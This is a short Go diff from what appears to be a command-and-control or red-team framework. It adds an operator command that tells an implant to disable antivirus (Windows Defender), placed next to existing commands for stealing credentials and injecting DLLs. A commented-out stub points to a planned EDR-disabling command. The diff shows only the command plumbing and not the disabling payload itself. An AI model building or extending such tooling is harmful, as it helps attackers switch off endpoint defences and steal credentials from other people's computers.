@@ -171,6 +171,31 @@ type amTaskCredsCmd struct {
 	Steal amTaskCredsStealCmd `cmd:"" help:"Steal credentials from various resources on the target computer"`
 }
 
+// DISABLE (AV or EDR)
+type amTaskDisableAvCmd struct{}
+
+func (c *amTaskDisableAvCmd) Run(
+	ctx *kong.Context,
+	serverState *servState.ServerState,
+	clientState *cliState.ClientState,
+) error {
+	task, err := _task.NewTask("disable av", map[string]string{})
+	if err != nil {
+		return err
+	}
+
+	err = handler.HandleAmTaskSet(task, serverState, clientState)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+type amTaskDisableCmd struct {
+	Av amTaskDisableAvCmd `cmd:"" help:"Disable AV (Widnows Defender)."`
+	// Edr amTaskDisableEdrCmd `cmd:"" help:"Disable EDR."`
+}
+
 // DLL
 type amTaskDllCmd struct {
 	File string `short:"f" name:"file" required:"" type:"path" help:"Specify the DLL file path to inject."`
